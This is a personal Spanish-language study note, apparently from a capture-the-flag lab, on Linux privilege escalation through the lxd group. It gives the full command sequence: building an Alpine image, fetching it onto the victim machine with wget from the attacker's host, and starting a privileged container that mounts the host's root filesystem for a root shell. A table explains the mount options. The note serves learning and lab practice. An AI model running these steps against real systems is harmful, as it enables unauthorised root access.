#lxd

------

Nota de [[lxd]]

[Articulo hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html)

Para descargar la imagen y crearla en nuestra maquina
```
git clone https://github.com/saghul/lxd-alpine-builder  
cd lxd-alpine-builder  
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine  
/////// Este comando modifica el script `build-alpine` para que use una **versión específica de Alpine** (en este caso, `v3.8`) en vez de la última (`latest-stable`). Esto es útil si estás trabajando con arquitecturas antiguas como `i686`, que ya no se soportan en las últimas versiones de Alpine.(Esto seria 32 bits)
sudo ./build-alpine -a i686  //Esto es para crear la imagen ya configurada en formato .tar.gz
```
Despues nos pusimos en escucha con [[python3 -m http.server]] . Y desde la maquina victima con `wget 10.10.14.8:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz` descargamos la imagen

#### Ahora para levantar el contenedor:
```shell
lxc image import ./alpine*.tar.gz --alias myimage     //Importa la imagen con nombre alpine y le da el nombre ed imagen myimage
lxd init             //inicia lxd si nunca se habia hecho antes
lxc init myimage mycontainer -c security.privileged=true     // el parametro de -c security.privileged=true  hace que se ejecute como root
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true    // Explicado abajo de todo en notas
lxc start mycontainer  //Prende el contenedor
lxc exec mycontainer /bin/bash        //Entra al contenedor con el binario /bin/bash
```
Una vez hecho esto ya podemos ya podemos catear las flags por que somos root

![[Included13.png]]

--------

# Notas

### 🔍 Parámetros explicados:
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

| Parte                   | Significado                                                                                                              |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `lxc config device add` | Agrega un **dispositivo virtual** al contenedor (en este caso, un disco/directorio).                                     |
| `mycontainer`           | Es el **nombre del contenedor** al que se lo estás agregando.                                                            |
| `mydevice`              | Es un **nombre arbitrario** para el dispositivo que estás montando (podés ponerle otro nombre si querés).                |
| `disk`                  | Indica que estás agregando un **dispositivo de tipo disco** (puede ser un directorio, un disco real o virtual).          |
| `source=/`              | El **directorio del host** que querés montar (en este caso, la raíz del sistema `/`).                                    |
| `path=/mnt/root`        | La **ruta dentro del contenedor** donde aparecerá ese contenido (en este caso, el host estará accesible en `/mnt/root`). |
| `recursive=true`        | Hace que el montaje incluya **todos los subdirectorios y sus contenidos** de forma recursiva.                            |
